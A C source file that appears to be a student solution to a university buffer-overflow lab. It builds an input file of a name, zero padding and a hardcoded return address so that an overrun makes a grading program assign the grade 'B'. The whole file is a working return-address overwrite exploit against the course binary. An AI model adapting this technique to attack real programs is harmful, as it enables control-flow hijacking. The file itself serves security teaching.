
/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Derek Geng and Emily Luo                                   */
/*--------------------------------------------------------------------*/
#include <stdio.h>

enum {MAX_BYTES = 48};

/*  Creates a buffer overrun file that sets grade to 'B'. 
    Writes name out to file dataB.
    Returns 0 if successful. */
    
int main(void) {
    int bytes = 0;
    unsigned long b_address = 0x400858;
    FILE * fp = fopen("dataB", "w");

    /* write name to dataB */
    fputs("Derek Geng",fp);
    bytes+=10;
   
    /* check if name is too long */
    if (bytes == MAX_BYTES) {
        fprintf(stderr, "Name is too long\n");
        return 1;
    }

    /* write the rest of the buffer */
    while (bytes != MAX_BYTES){
        fputc(0, fp);
        bytes++;
    }
    /* write new return address to grade = 'B' */
    fwrite(&b_address, sizeof(unsigned long), 1, fp);

    /* write EOF */
    fputc(EOF, fp);
    fclose(fp);
    return 0;
}